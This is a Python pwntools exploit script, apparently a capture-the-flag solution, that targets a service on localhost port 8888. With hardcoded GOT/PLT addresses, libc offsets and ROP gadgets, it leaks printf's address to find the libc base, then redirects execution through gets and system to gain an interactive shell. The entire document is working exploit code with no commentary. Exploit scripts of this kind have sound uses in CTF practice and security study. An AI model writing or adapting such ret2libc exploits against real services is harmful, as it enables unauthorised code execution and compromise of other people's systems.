#!/usr/bin/env python

from pwn import *

main = 0x0804851d
puts_plt = 0x080483c0
printf_plt = 0x080483b0

puts_got = 0x0804a010
printf_got = 0x0804a00c

puts_off = 0x65650
gets_off = 0x64cd0
system_off = 0x40190
printf_off = 0x4d280

gadget_pop1ret = 0x0804839d
gadget_pop2ret = 0x0804881e
gadget_pop3ret = 0x0804881d
gadget_pop4ret = 0x0804881c

def send(s):
#    print s
    r.send(s + '\n')
    return r.recvrepeat(0.5)

r = remote('127.0.0.1', 8888)

mesg = ('-1 -1 ' +
    '1 '*20 + '0 ' +
    '1600 ' + str(puts_plt) + ' ' + str(main) + ' ' + str(printf_got) + ' ' +
    '16 32 48 64 80 96 112 128 0\n')

print mesg
recv = send(mesg)
print "////" + recv[-44:]
base = u32(recv[-44:-40]) - printf_off
# base = u32(r.recvline()[:4]) - puts_off

print 'libc base =', hex(base)

system = base + system_off
gets = base + gets_off
puts = base + puts_off
print

mesg = ('-1 -1 ' +
    '1 '*35 + '0 ' +
     str(gets) + ' ' + str(system) + ' ' + str(puts_got) + ' ' + str(puts_got) + ' '
    '48 32 16 0\n')
print mesg
r.send(mesg)

r.interactive()
